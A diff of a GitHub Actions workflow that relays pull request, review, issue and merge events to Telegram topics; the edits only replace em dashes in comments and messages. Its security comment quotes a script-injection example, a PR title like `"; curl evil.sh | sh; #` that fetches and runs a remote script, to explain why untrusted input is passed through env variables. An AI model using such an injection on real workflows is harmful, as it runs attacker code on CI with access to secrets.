@@ -7,14 +7,14 @@ name: Notify Telegram
 #   GH PR Comments   comments on a pull request
 #   GH Reviews       review submitted (approved / changes requested) · code comments
 #   GH Issues        issue opened/reopened/closed · comments on an issue
-#   Dev Ops          PR MERGED — see below
+#   Dev Ops          PR MERGED: see below
 #
 # A merged PR is routed to Dev Ops, not to a PR topic, because merging is what
 # puts code on main. Sitting next to the green/red that follows it, the two read
 # as one entry: "this landed, and the tree is fine."
 #
 # ─────────────────────────────────────────────────────────────────────────────
-# ROUTING — the two traps.
+# ROUTING: the two traps.
 #
 # 1. GitHub has no "PR comment" event. A comment on a pull request arrives as
 #    `issue_comment`, exactly like a comment on an issue, because PRs are issues
@@ -23,11 +23,11 @@ name: Notify Telegram
 #    comments, and is how the two are told apart below.
 #
 # 2. Merged and abandoned PRs both arrive as `closed`. Only
-#    `github.event.pull_request.merged` distinguishes shipping from giving up —
+#    `github.event.pull_request.merged` distinguishes shipping from giving up:
 #    without it the channel congratulates you for PRs you rejected.
 #
 # ─────────────────────────────────────────────────────────────────────────────
-# SECURITY — read before editing.
+# SECURITY: read before editing.
 #
 # `pull_request_target` runs in the context of the BASE repo and therefore has
 # access to repository secrets. That is the only way a fork PR can trigger a
@@ -41,8 +41,8 @@ name: Notify Telegram
 #   - runs no code from the PR
 #   - reads only `github.event` metadata, passed via env rather than interpolated
 #     into the shell (interpolating a PR title directly into `run:` is a script
-#     injection — a title like `"; curl evil.sh | sh; #` would execute)
-#   - requests `permissions: {}` — no token access at all
+#     injection: a title like `"; curl evil.sh | sh; #` would execute)
+#   - requests `permissions: {}`, no token access at all
 #
 # If you ever need to run tests here, do it in test.yml under `pull_request`,
 # never in this file.
@@ -84,11 +84,11 @@ jobs:
           TOPIC_PR_OPENED: ${{ vars.TELEGRAM_TOPIC_PR_OPENED }}
           TOPIC_PR_COMMENTS: ${{ vars.TELEGRAM_TOPIC_PR_COMMENTS }}
           # A merged PR is a deployment event, so it goes to Dev Ops rather than
-          # a PR topic — see the pull_request_target branch below.
+          # a PR topic (see the pull_request_target branch below).
           TOPIC_DEVOPS: ${{ vars.TELEGRAM_TOPIC_DEVOPS }}
           TOPIC_REVIEWS: ${{ vars.TELEGRAM_TOPIC_REVIEWS }}
           TOPIC_ISSUES: ${{ vars.TELEGRAM_TOPIC_ISSUES }}
-          # Everything below is untrusted input — env, never inline interpolation.
+          # Everything below is untrusted input: env, never inline interpolation.
           KIND: ${{ github.event_name }}
           ACTION: ${{ github.event.action }}
           # A closed PR is either merged or abandoned; only `merged` tells them apart.
@@ -110,11 +110,11 @@ jobs:
           set -euo pipefail
 
           if [ -z "${TG_TOKEN:-}" ] || [ -z "${TG_CHAT:-}" ]; then
-            echo "TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set — skipping."
+            echo "TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set, skipping."
             exit 0
           fi
 
-          # `export` matters — the python heredoc below is a subprocess and only
+          # `export` matters: the python heredoc below is a subprocess and only
           # sees exported variables. Without it every lookup KeyErrors and nothing sends.
           export BODY=""
           case "$KIND" in
@@ -131,7 +131,7 @@ jobs:
               if [ "$ACTION" = "closed" ]; then
                 # Merged and abandoned both arrive as `closed`, and they mean opposite
                 # things. A merge is what puts code on main, so it belongs in Dev Ops
-                # next to the green/red that follows it — read together they say "this
+                # next to the green/red that follows it: read together they say "this
                 # landed and the tree is fine". An abandoned PR shipped nothing, so it
                 # stays with the rest of the PR lifecycle.
                 if [ "$MERGED" = "true" ]; then
@@ -178,7 +178,7 @@ jobs:
 
           # Telegram's HTML parse_mode allows only a small tag set. An unescaped
           # "<3" or "<script>" in a title returns 400 "can't parse entities" and the
-          # notification silently never arrives — so escape every untrusted value
+          # notification silently never arrives. So escape every untrusted value
           # and keep only the tags we add ourselves.
           def esc(value: str, limit: int) -> str:
               return html.escape(value[:limit], quote=False)
